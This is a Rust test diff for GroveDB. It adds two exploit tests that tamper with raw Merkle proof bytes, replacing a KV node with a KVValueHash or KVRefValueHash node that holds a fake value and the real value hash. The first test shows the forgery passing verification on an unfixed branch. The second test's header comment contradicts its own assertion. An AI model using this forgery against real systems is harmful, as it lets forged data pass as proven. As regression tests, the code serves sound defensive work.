@@ -5915,4 +5915,362 @@ mod tests {
             results.len()
         );
     }
+
+    // =========================================================================
+    // KV → KVValueHash substitution exploit test (reference: should succeed
+    // on develop since the fix hasn't landed yet)
+    // =========================================================================
+
+    /// Replace a KV node (tag 0x03) with KVValueHash (tag 0x04) in raw merk
+    /// proof bytes. KVValueHash has the same key+value layout as KV but with
+    /// an extra 32-byte hash appended.
+    fn tamper_kv_to_kvvaluehash(
+        merk_proof: &mut Vec<u8>,
+        target_key: &[u8],
+        real_element_bytes: &[u8],
+        fake_element_bytes: &[u8],
+        real_value_hash: &[u8; 32],
+    ) -> bool {
+        let mut i = 0;
+        while i < merk_proof.len() {
+            if merk_proof[i] == 0x03 {
+                if i + 1 >= merk_proof.len() {
+                    i += 1;
+                    continue;
+                }
+                let key_len = merk_proof[i + 1] as usize;
+                let key_start = i + 2;
+                let key_end = key_start + key_len;
+                if key_end + 2 > merk_proof.len() {
+                    i += 1;
+                    continue;
+                }
+                let key_bytes = &merk_proof[key_start..key_end];
+                if key_bytes != target_key {
+                    i += 1;
+                    continue;
+                }
+                let value_len =
+                    u16::from_be_bytes([merk_proof[key_end], merk_proof[key_end + 1]]) as usize;
+                let value_start = key_end + 2;
+                let value_end = value_start + value_len;
+                if value_end > merk_proof.len() {
+                    i += 1;
+                    continue;
+                }
+                let value_bytes = &merk_proof[value_start..value_end];
+                if value_bytes != real_element_bytes {
+                    i += 1;
+                    continue;
+                }
+
+                // Build KVValueHash: [0x04, key_len, key, value_len, fake_value, hash_32]
+                let mut replacement = Vec::new();
+                replacement.push(0x04); // KVValueHash tag
+                replacement.push(key_len as u8);
+                replacement.extend_from_slice(target_key);
+                replacement.extend_from_slice(&(fake_element_bytes.len() as u16).to_be_bytes());
+                replacement.extend_from_slice(fake_element_bytes);
+                replacement.extend_from_slice(real_value_hash);
+
+                let old_len = value_end - i;
+                merk_proof.splice(i..i + old_len, replacement);
+                return true;
+            }
+            i += 1;
+        }
+        false
+    }
+
+    #[test]
+    fn kv_to_kvvaluehash_forgery_exploit() {
+        let grove_version = GroveVersion::latest();
+        let db = make_test_grovedb(grove_version);
+
+        let real_value = b"real_secret_value".to_vec();
+        let fake_value = b"attacker_controlled".to_vec();
+
+        db.insert(
+            [TEST_LEAF].as_ref(),
+            b"mykey",
+            Element::new_item(real_value.clone()),
+            None,
+            None,
+            grove_version,
+        )
+        .unwrap()
+        .expect("should insert item");
+
+        let mut query = Query::new();
+        query.insert_key(b"mykey".to_vec());
+        let path_query = PathQuery::new_unsized(vec![TEST_LEAF.to_vec()], query);
+
+        let proof_bytes = db
+            .prove_query(&path_query, None, grove_version)
+            .unwrap()
+            .expect("should generate proof");
+
+        let valid_result = GroveDb::verify_query_raw(&proof_bytes, &path_query, grove_version);
+        assert!(valid_result.is_ok(), "valid proof should verify");
+
+        let real_element_bytes = Element::new_item(real_value.clone())
+            .serialize(grove_version)
+            .unwrap();
+        let real_vh = grovedb_merk::tree::hash::value_hash(&real_element_bytes).unwrap();
+
+        let fake_element_bytes = Element::new_item(fake_value.clone())
+            .serialize(grove_version)
+            .unwrap();
+
+        let config = bincode::config::standard()
+            .with_big_endian()
+            .with_limit::<{ 256 * 1024 * 1024 }>();
+        let (mut grovedb_proof, _): (GroveDBProof, _) =
+            bincode::decode_from_slice(&proof_bytes, config).expect("should decode proof");
+
+        let tampered = match grovedb_proof {
+            GroveDBProof::V0(ref mut v0) => tamper_kv_to_kvvaluehash(
+                &mut v0
+                    .root_layer
+                    .lower_layers
+                    .get_mut(TEST_LEAF)
+                    .unwrap()
+                    .merk_proof,
+                b"mykey",
+                &real_element_bytes,
+                &fake_element_bytes,
+                &real_vh,
+            ),
+            GroveDBProof::V1(ref mut v1) => {
+                let leaf_layer = v1.root_layer.lower_layers.get_mut(TEST_LEAF).unwrap();
+                match leaf_layer.merk_proof {
+                    crate::operations::proof::ProofBytes::Merk(ref mut bytes) => {
+                        tamper_kv_to_kvvaluehash(
+                            bytes,
+                            b"mykey",
+                            &real_element_bytes,
+                            &fake_element_bytes,
+                            &real_vh,
+                        )
+                    }
+                    _ => false,
+                }
+            }
+        };
+        assert!(tampered, "should have found and tampered the KV node");
+
+        let tampered_proof_bytes =
+            bincode::encode_to_vec(&grovedb_proof, config).expect("should re-encode proof");
+
+        let tampered_result =
+            GroveDb::verify_query_raw(&tampered_proof_bytes, &path_query, grove_version);
+
+        // On develop (no fix), this exploit SUCCEEDS — the verifier accepts the
+        // fake value. The fix (on the PR branch) rejects KVValueHash nodes
+        // containing item elements at the merk verification level.
+        match tampered_result {
+            Ok((_, results)) => {
+                let got_fake = results.iter().any(|pkv| {
+                    let element = Element::deserialize(&pkv.value, grove_version);
+                    matches!(element, Ok(Element::Item(v, _)) if v == fake_value)
+                });
+                assert!(
+                    got_fake,
+                    "KV→KVValueHash forgery should succeed on develop (no fix). \
+                     Got unexpected results: {:?}",
+                    results
+                );
+            }
+            Err(e) => {
+                panic!(
+                    "KV→KVValueHash forgery was rejected on develop — this is unexpected. \
+                     Error: {}",
+                    e
+                );
+            }
+        }
+    }
+
+    // =========================================================================
+    // KV → KVRefValueHash substitution exploit test
+    //
+    // This test demonstrates that an attacker can replace a KV node (tag 0x03)
+    // with a KVRefValueHash node (tag 0x06) in a merk proof, keeping the
+    // original value_hash but substituting a fake value. The merk verifier
+    // accepts the proof because it trusts the provided value_hash for
+    // KVRefValueHash nodes (just like KVValueHash), and the GroveDB layer
+    // has no way to distinguish legitimate reference results from forged ones.
+    // =========================================================================
+
+    /// Replace a KV node (tag 0x03) with KVRefValueHash (tag 0x06) in raw merk
+    /// proof bytes. Both have the same binary layout:
+    ///   [tag, key_len, key..., value_len_u16, value..., hash_32bytes]
+    /// except KV doesn't have the trailing hash — the verifier computes it.
+    /// For KVRefValueHash, we append the real value_hash so the tree hash
+    /// matches, but substitute a fake value.
+    fn tamper_kv_to_kvrefvaluehash(
+        merk_proof: &mut Vec<u8>,
+        target_key: &[u8],
+        real_element_bytes: &[u8],
+        fake_element_bytes: &[u8],
+        real_value_hash: &[u8; 32],
+    ) -> bool {
+        // Scan for KV node (tag 0x03) containing our target key+value
+        let mut i = 0;
+        while i < merk_proof.len() {
+            if merk_proof[i] == 0x03 {
+                // KV Push: [0x03, key_len, key..., value_len_u16_be, value...]
+                if i + 1 >= merk_proof.len() {
+                    i += 1;
+                    continue;
+                }
+                let key_len = merk_proof[i + 1] as usize;
+                let key_start = i + 2;
+                let key_end = key_start + key_len;
+                if key_end + 2 > merk_proof.len() {
+                    i += 1;
+                    continue;
+                }
+                let key_bytes = &merk_proof[key_start..key_end];
+                if key_bytes != target_key {
+                    i += 1;
+                    continue;
+                }
+                let value_len =
+                    u16::from_be_bytes([merk_proof[key_end], merk_proof[key_end + 1]]) as usize;
+                let value_start = key_end + 2;
+                let value_end = value_start + value_len;
+                if value_end > merk_proof.len() {
+                    i += 1;
+                    continue;
+                }
+                let value_bytes = &merk_proof[value_start..value_end];
+                if value_bytes != real_element_bytes {
+                    i += 1;
+                    continue;
+                }
+
+                // Found it! Build the replacement:
+                // KVRefValueHash: [0x06, key_len, key..., value_len_u16, fake_value..., hash_32]
+                let mut replacement = Vec::new();
+                replacement.push(0x06); // KVRefValueHash tag
+                replacement.push(key_len as u8);
+                replacement.extend_from_slice(target_key);
+                replacement.extend_from_slice(&(fake_element_bytes.len() as u16).to_be_bytes());
+                replacement.extend_from_slice(fake_element_bytes);
+                replacement.extend_from_slice(real_value_hash);
+
+                // Splice: remove old KV node, insert new KVRefValueHash node
+                let old_len = value_end - i; // original KV node length
+                merk_proof.splice(i..i + old_len, replacement);
+                return true;
+            }
+            i += 1;
+        }
+        false
+    }
+
+    #[test]
+    fn kv_to_kvrefvaluehash_forgery_exploit() {
+        let grove_version = GroveVersion::latest();
+        let db = make_test_grovedb(grove_version);
+
+        let real_value = b"real_secret_value".to_vec();
+        let fake_value = b"attacker_controlled".to_vec();
+
+        db.insert(
+            [TEST_LEAF].as_ref(),
+            b"mykey",
+            Element::new_item(real_value.clone()),
+            None,
+            None,
+            grove_version,
+        )
+        .unwrap()
+        .expect("should insert item");
+
+        let mut query = Query::new();
+        query.insert_key(b"mykey".to_vec());
+        let path_query = PathQuery::new_unsized(vec![TEST_LEAF.to_vec()], query);
+
+        // Generate a valid proof
+        let proof_bytes = db
+            .prove_query(&path_query, None, grove_version)
+            .unwrap()
+            .expect("should generate proof");
+
+        // Sanity: the valid proof verifies correctly
+        let valid_result = GroveDb::verify_query_raw(&proof_bytes, &path_query, grove_version);
+        assert!(valid_result.is_ok(), "valid proof should verify");
+
+        // Compute the real value_hash. The merk value is the serialized Element.
+        let real_element_bytes = Element::new_item(real_value.clone())
+            .serialize(grove_version)
+            .unwrap();
+        let real_vh = grovedb_merk::tree::hash::value_hash(&real_element_bytes).unwrap();
+
+        let fake_element_bytes = Element::new_item(fake_value.clone())
+            .serialize(grove_version)
+            .unwrap();
+
+        // Decode GroveDB proof, tamper the leaf layer's merk_proof, re-encode
+        let config = bincode::config::standard()
+            .with_big_endian()
+            .with_limit::<{ 256 * 1024 * 1024 }>();
+        let (mut grovedb_proof, _): (GroveDBProof, _) =
+            bincode::decode_from_slice(&proof_bytes, config).expect("should decode proof");
+
+        let tampered = match grovedb_proof {
+            GroveDBProof::V0(ref mut v0) => tamper_kv_to_kvrefvaluehash(
+                &mut v0
+                    .root_layer
+                    .lower_layers
+                    .get_mut(TEST_LEAF)
+                    .unwrap()
+                    .merk_proof,
+                b"mykey",
+                &real_element_bytes,
+                &fake_element_bytes,
+                &real_vh,
+            ),
+            GroveDBProof::V1(ref mut v1) => {
+                let leaf_layer = v1.root_layer.lower_layers.get_mut(TEST_LEAF).unwrap();
+                match leaf_layer.merk_proof {
+                    crate::operations::proof::ProofBytes::Merk(ref mut bytes) => {
+                        tamper_kv_to_kvrefvaluehash(
+                            bytes,
+                            b"mykey",
+                            &real_element_bytes,
+                            &fake_element_bytes,
+                            &real_vh,
+                        )
+                    }
+                    _ => false,
+                }
+            }
+        };
+        assert!(tampered, "should have found and tampered the KV node");
+
+        // Re-encode the tampered proof
+        let tampered_proof_bytes =
+            bincode::encode_to_vec(&grovedb_proof, config).expect("should re-encode proof");
+
+        // === Verify the tampered proof ===
+        // KVRefValueHash is NOT vulnerable because its tree hash computation
+        // includes H(referenced_value) via combine_hash(node_value_hash,
+        // H(referenced_value)). If the value changes, the tree hash changes,
+        // and the root hash won't match.
+        //
+        // This is different from KVValueHash, which uses the provided value_hash
+        // directly without incorporating the value into the tree hash.
+        let tampered_result =
+            GroveDb::verify_query_raw(&tampered_proof_bytes, &path_query, grove_version);
+
+        assert!(
+            tampered_result.is_err(),
+            "KV→KVRefValueHash forgery should be rejected because \
+             KVRefValueHash incorporates H(value) into the tree hash via \
+             combine_hash, so changing the value changes the root hash"
+        );
+    }
 }
